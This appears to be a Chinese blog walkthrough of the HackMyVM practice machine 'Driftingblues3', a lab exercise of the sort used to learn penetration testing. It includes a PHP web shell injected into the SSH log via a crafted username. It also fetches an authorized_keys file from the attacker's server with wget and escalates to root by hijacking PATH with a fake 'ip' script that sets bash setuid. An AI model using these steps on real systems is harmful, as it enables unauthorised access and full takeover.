---
title: Driftingblues3
author: hgbe02
date: 2024-04-11
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Driftingblues3.html"
---

# driftingblues3

在做`superhuman`的时候发现FUZZ时间太长了，先换一个靶机做做：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424518.png" alt="image-20240411122613084" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
Open 172.20.10.6:22
Open 172.20.10.6:80
```

```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4uqqKMblsYkzCZ7j1Mn8OX4iKqTf55w3nolFxM6IDIrQ7SV4JthEGqnYsiWFGY0OpwHLJ80/pnc/Ehlnub7RCGyL5gxGkGhZPKYag6RDv0cJNgIHf5oTkJOaFhRhZPDXztGlfafcVVw0Agxg3xweEVfU0GP24cb7jXq8Obu0j4bNsx7L0xbDCB1zxYwiqBRbkvRWpiQXNns/4HKlFzO19D8bCY/GXeX4IekE98kZgcG20x/zoBjMPXWXHUcYKoIVXQCDmBGAnlIdaC7IBJMNc1YbXVv7vhMRtaf/ffTtNDX0sYydBbqbubdZJsjWL0oHHK3Uwf+HlEhkO1jBZw3Aj
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDkds8dHvtrZmMxX2P71ej+q+QDe/MG8OGk7uYjWBT5K/TZR/QUkD9FboGbq1+SpCox5qqIVo8UQ+xvcEDDVKaU=
|   256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIoK0bHJ3ceMQ1mfATBnU9sChixXFA613cXEXeAyl2Y2
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 1 disallowed entry 
|_/eventadmins
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
feroxbuster -u http://172.20.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 2 -s 200 301 302
```

fuzz在使用gobuster，这里就换一个了。

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.20.10.6
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      316c http://172.20.10.6/eventadmins => http://172.20.10.6/eventadmins/
301      GET        9l       28w      312c http://172.20.10.6/privacy => http://172.20.10.6/privacy/
200      GET       16l       34w      347c http://172.20.10.6/tickets.html
200      GET     7078l    39790w  3674378c http://172.20.10.6/cr.png
200      GET       42l      133w     1373c http://172.20.10.6/
301      GET        9l       28w      311c http://172.20.10.6/drupal => http://172.20.10.6/drupal/
301      GET        9l       28w      311c http://172.20.10.6/secret => http://172.20.10.6/secret/
200      GET        1l        1w       11c http://172.20.10.6/Makefile
301      GET        9l       28w      313c http://172.20.10.6/wp-admin => http://172.20.10.6/wp-admin/
200      GET       97l      823w     7345c http://172.20.10.6/wp-admin/readme.html
200      GET        1l        3w       20c http://172.20.10.6/secret/devices
301      GET        9l       28w      315c http://172.20.10.6/phpmyadmin => http://172.20.10.6/phpmyadmin/
[####################] - 20m  1323290/1323290 0s      found:12      errors:243    
[####################] - 20m   220546/220546  188/s   http://172.20.10.6/ 
[####################] - 20m   220546/220546  188/s   http://172.20.10.6/eventadmins/ 
[####################] - 20m   220546/220546  188/s   http://172.20.10.6/privacy/ 
[####################] - 19m   220546/220546  189/s   http://172.20.10.6/drupal/ 
[####################] - 19m   220546/220546  189/s   http://172.20.10.6/secret/ 
[####################] - 0s    220546/220546  1016341/s http://172.20.10.6/wp-admin/ => Directory listing
[####################] - 19m   220546/220546  193/s   http://172.20.10.6/phpmyadmin/             
```

### wpscan扫描

扫的时候就看到`wp-admin`了，猜测是`wordpress`站点，扫一下：

```bash
wpscan --url http://172.20.10.6/
Scan Aborted: The remote website is up, but does not seem to be running WordPress.
```

额。

## 漏洞利用

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424520.png" alt="image-20240411123238251" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424521.png" alt="image-20240411123249889" style="zoom:50%;" />

### 访问敏感目录

```apl
http://172.20.10.6/tickets.html
```

![image-20240411123327602](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424522.png)

```apl
http://172.20.10.6/wp-admin/readme.html
# 进去只有一个文件，就是这个
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424523.png" alt="image-20240411123440945" style="zoom:50%;" />

```apl
http://172.20.10.6/robots.txt
```

```apl
User-agent: *
Disallow: /eventadmins
```

```apl
http://172.20.10.6/eventadmins/
```

```apl
man there's a problem with ssh
john said "it's poisonous!!! stay away!!!"
idk if he's mentally challenged
please find and fix it
also check /littlequeenofspades.html
your buddy, buddyG
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424524.png" alt="image-20240411131620733" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424525.png" alt="image-20240411131630923" style="zoom: 33%;" />

我有写wp的习惯直接拿下！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424526.png" alt="image-20240411131748092" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424527.png" alt="image-20240411131801986" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424528.png" alt="image-20240411131828959" style="zoom:50%;" />

### 日志注入

尝试日志注入，这是ssh登录的日志！

```bash
ssh '<?php system($_GET["hack"]);?>'@172.20.10.6
```

> 这里一定要检测一下哦，否则传进去就撤不回来了！

```bash
┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ ssh '<?php system($_GET["hack"]);?>'@172.20.10.6
remote username contains invalid characters

┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ echo -n "<?php system($_GET["hack"]);?>" | base64
PD9waHAgc3lzdGVtKCk7Pz4=

┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ ssh -p 22 PD9waHAgc3lzdGVtKCk7Pz4=@172.20.10.6
PD9waHAgc3lzdGVtKCk7Pz4=@172.20.10.6: Permission denied (publickey).
```

但是使用不了，可以尝试换一个老一点的虚拟机尝试连接，我这里选择使用msf进行连接：

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.20.10.6
rhosts => 172.20.10.6
msf6 auxiliary(scanner/ssh/ssh_login) > set username <?php system($_GET['hack']);?>
username => <?php system($_GET[hack]);?>
msf6 auxiliary(scanner/ssh/ssh_login) > set password 123456
password => 123456
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting               Required  Description
   ----              ---------------               --------  -----------
   ANONYMOUS_LOGIN   false                         yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                             yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                         no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                          no        Skip existing credentials stored in the current database (Accepted: none, user, user&real
                                                             m)
   PASSWORD          123456                        no        A specific password to authenticate with
   PASS_FILE                                       no        File containing passwords, one per line
   RHOSTS            172.20.10.6                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-me
                                                             tasploit.html
   RPORT             22                            yes       The target port
   STOP_ON_SUCCESS   false                         yes       Stop guessing when a credential works for a host
   THREADS           1                             yes       The number of concurrent threads (max one per host)
   USERNAME          <?php system($_GET[hack]);?>  no        A specific username to authenticate as
   USERPASS_FILE                                   no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                         no        Try the username as the password for all users
   USER_FILE                                       no        File containing usernames, one per line
   VERBOSE           false                         yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 172.20.10.6:22 - Starting bruteforce
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424529.png" alt="image-20240411135747633" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424530.png" alt="image-20240411135917985" style="zoom:50%;" />

成功了，尝试反弹回来：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424531.png" alt="image-20240411140258791" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111424532.png" alt="image-20240411140305880" style="zoom:50%;" />

## 提权

### 切换robertj用户

```bash
┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ ssh-keygen -t rsa -b 4096 -f /home/kali/temp/driftingblues3/driftingblues3
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/temp/driftingblues3/driftingblues3
Your public key has been saved in /home/kali/temp/driftingblues3/driftingblues3.pub
The key fingerprint is:
SHA256:aQNB8/fPotfco8O1/l+0EQtVma54etvW3tj+QOl/RqA kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|     .+        .=|
|       +      .o |
|      . . .  ... |
|       . o .  ooo|
|        S   o.++.|
|       . . .EB o+|
|            =o*++|
|           o.=+OB|
|          ...oB*/|
+----[SHA256]-----+

┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ ls    
driftingblues3  driftingblues3.pub

┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ mv driftingblues3.pub authorized_keys

┌──(kali💀kali)-[~/temp/driftingblues3]
└─$ python3 -m http.server 8888                                     
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
172.20.10.6 - - [11/Apr/2024 02:10:09] "GET /authorized_keys HTTP/1.1" 200 -
```

```bash
(remote) www-data@driftingblues:/home/robertj$ ls -la
total 16
drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 .
drwxr-xr-x 4 root    root    4096 Jan  4  2021 ..
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
-r-x------ 1 robertj robertj   33 Jan  7  2021 user.txt
(remote) www-data@driftingblues:/home/robertj$ cd .ssh
(remote) www-data@driftingblues:/home/robertj/.ssh$ wget http://172.20.10.8:8888/authorized_keys
--2024-04-11 01:10:11--  http://172.20.10.8:8888/authorized_keys
Connecting to 172.20.10.8:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 735 [application/octet-stream]
Saving to: 'authorized_keys'

authorized_keys                       100%[=========================================================================>]     735  --.-KB/s    in 0s      

2024-04-11 01:10:11 (94.4 MB/s) - 'authorized_keys' saved [735/735]
```

ssh连接一下：

```bash
(local) pwncat$ lcd temp/driftingblues3
(local) pwncat$ connect robertj@172.20.10.6 -i driftingblues3
[02:12:18] 172.20.10.6:22: normalizing shell path                                                                                         manager.py:957           172.20.10.6:22: loaded known host from db                                                                                      manager.py:957
(local) pwncat$                                                                                                                                         
(remote) robertj@driftingblues:/home/robertj$ whoami;id
robertj
uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)
```

> 直接`ssh robertj@172.20.10.6 -i driftingblues3`一样的效果

### 信息搜集

```bash
(remote) robertj@driftingblues:/home/robertj$ cat user.txt 
413fc08db21285b1f8abea99040b0280
(remote) robertj@driftingblues:/home/robertj$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
(remote) robertj@driftingblues:/home/robertj$ ls -l /usr/bin/getinfo
-r-sr-s--- 1 root operators 16704 Jan  4  2021 /usr/bin/getinfo
(remote) robertj@driftingblues:/home/robertj$ /usr/bin/getinfo
###################
ip address
###################

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:f1:6a:52 brd ff:ff:ff:ff:ff:ff
    inet 172.20.10.6/28 brd 172.20.10.15 scope global dynamic enp0s3
       valid_lft 79710sec preferred_lft 79710sec
    inet6 fe80::a00:27ff:fef1:6a52/64 scope link 
       valid_lft forever preferred_lft forever
###################
hosts
###################

127.0.0.1       localhost
127.0.1.1       driftingblues

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
###################
os info
###################

Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
(remote) robertj@driftingblues:/home/robertj$ file /usr/bin/getinfo
/usr/bin/getinfo: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=50c270711d2a2d6c688d5c498e50a3d38b4f7ff5, for GNU/Linux 3.2.0, not stripped
(remote) robertj@driftingblues:/home/robertj$ cd /usr/bin
(remote) robertj@driftingblues:/usr/bin$ 
(local) pwncat$ download getinfo
getinfo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 16.7/16.7 KB • ? • 0:00:00[02:16:01] downloaded 16.70KiB in 0.58 seconds 
```

看到了奇怪的东西，下载到本地看看：

```c
// main.c
undefined8 main(void)
{
    setuid(0);
    puts("###################\nip address\n###################\n");
    system("ip a");
    puts("###################\nhosts\n###################\n");
    system("cat /etc/hosts");
    puts("###################\nos info\n###################\n");
    system("uname -a");
    return 0;
}
```

尝试更改环境变量，使我们写的函数先执行：

```bash
(remote) robertj@driftingblues:/usr/bin$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:f1:6a:52 brd ff:ff:ff:ff:ff:ff
    inet 172.20.10.6/28 brd 172.20.10.15 scope global dynamic enp0s3
       valid_lft 79535sec preferred_lft 79535sec
    inet6 fe80::a00:27ff:fef1:6a52/64 scope link 
       valid_lft forever preferred_lft forever
(remote) robertj@driftingblues:/usr/bin$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
(remote) robertj@driftingblues:/usr/bin$ cd /tmp
(remote) robertj@driftingblues:/tmp$ whereis ip
ip: /usr/bin/ip /usr/sbin/ip /usr/share/man/man8/ip.8.gz /usr/share/man/man7/ip.7.gz
(remote) robertj@driftingblues:/tmp$ echo 'chmod +s /bin/bash' > ip 
(remote) robertj@driftingblues:/tmp$ export PATH=$PWD:$PATH
(remote) robertj@driftingblues:/tmp$ ip
Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
       ip [ -force ] -batch filename
where  OBJECT := { link | address | addrlabel | route | rule | neigh | ntable |
                   tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm |
                   netns | l2tp | fou | macsec | tcp_metrics | token | netconf | ila |
                   vrf | sr }
       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
                    -f[amily] { inet | inet6 | ipx | dnet | mpls | bridge | link } |
                    -4 | -6 | -I | -D | -M | -B | -0 |
                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
                    -rc[vbuf] [size] | -n[etns] name | -a[ll] | -c[olor]}
(remote) robertj@driftingblues:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
(remote) robertj@driftingblues:/tmp$ chmod +x ip
(remote) robertj@driftingblues:/tmp$ ip
Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
       ip [ -force ] -batch filename
where  OBJECT := { link | address | addrlabel | route | rule | neigh | ntable |
                   tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm |
                   netns | l2tp | fou | macsec | tcp_metrics | token | netconf | ila |
                   vrf | sr }
       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
                    -f[amily] { inet | inet6 | ipx | dnet | mpls | bridge | link } |
                    -4 | -6 | -I | -D | -M | -B | -0 |
                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
                    -rc[vbuf] [size] | -n[etns] name | -a[ll] | -c[olor]}
(remote) robertj@driftingblues:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 17  2019 /bin/bash
(remote) robertj@driftingblues:/tmp$ ls
ip
systemd-private-fa91ead9eb6547fbb2292f8fa0bb8a88-apache2.service-0f3CMc
systemd-private-fa91ead9eb6547fbb2292f8fa0bb8a88-systemd-timesyncd.service-UkKFkN
(remote) robertj@driftingblues:/tmp$ sudo -l
-bash: sudo: command not found
(remote) robertj@driftingblues:/tmp$ getinfo
###################
ip address
###################

###################
hosts
###################

127.0.0.1       localhost
127.0.1.1       driftingblues

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
###################
os info
###################

Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
(remote) robertj@driftingblues:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 17  2019 /bin/bash
(remote) robertj@driftingblues:/tmp$ /bin/bash -p
(remote) root@driftingblues:/tmp# whoami;id
root
uid=1000(robertj) gid=1000(robertj) euid=0(root) egid=0(root) groups=0(root),1000(robertj),1001(operators)
(remote) root@driftingblues:/tmp# cd /root
(remote) root@driftingblues:/root# ls -la
total 20
drwx------  2 root root 4096 Jan  7  2021 .
drwxr-xr-x 18 root root 4096 Dec 17  2020 ..
-rw-------  1 root root   53 Jan  7  2021 .bash_history
-r-x------  1 root root   33 Jan  7  2021 root.txt
-rw-r--r--  1 root root 1031 Jan  4  2021 upit
(remote) root@driftingblues:/root# cat root.txt 
dfb7f604a22928afba370d819b35ec83
```

拿到flag！！！

